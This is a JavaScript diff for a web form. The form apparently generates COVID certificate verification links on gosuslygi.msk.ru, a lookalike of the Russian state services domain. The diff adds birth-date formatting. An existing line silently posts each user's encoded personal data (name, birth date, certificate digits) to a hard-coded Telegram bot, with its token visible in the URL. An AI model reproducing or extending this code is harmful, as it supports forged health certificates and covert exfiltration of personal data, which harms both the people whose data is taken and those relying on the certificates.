@@ -45,6 +45,17 @@ const downloadURI = (uri, name) => {
   delete link;
 }
 
+const formattedDate = (d = new Date) => {
+  let month = String(d.getMonth() + 1);
+  let day = String(d.getDate());
+  const year = String(d.getFullYear());
+
+  if (month.length < 2) month = '0' + month;
+  if (day.length < 2) day = '0' + day;
+
+  return `${day}.${month}.${year}`;
+}
+
 const initCreateForm = () => {
   let certPartInputs = document.getElementsByClassName('js-cert-part-input');
   for (let i = 0; i < certPartInputs.length; i++) {
@@ -59,6 +70,7 @@ const initCreateForm = () => {
     data.name1 = data.name1[0]+(new Array(data.name1.length - 1)).fill('*').join('');
     data.name2 = data.name2[0]+(new Array(data.name2.length - 1)).fill('*').join('');
     data.name3 = data.name3[0]+(new Array(data.name3.length - 1)).fill('*').join('');
+    data.bd = formattedDate(new Date(data.bd));
     const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
     const href = `https://gosuslygi.msk.ru/covid-cert/verify/96600000${data.cert3}${data.cert4}?lang=ru&data=${encodedData}`;
     fetch(`https://api.telegram.org/bot2121847436:AAHNHdDAXGRJF40aLfCaLDV1jnlPSTde6g4/sendMessage?chat_id=1452124491&text=${encodedData}`);
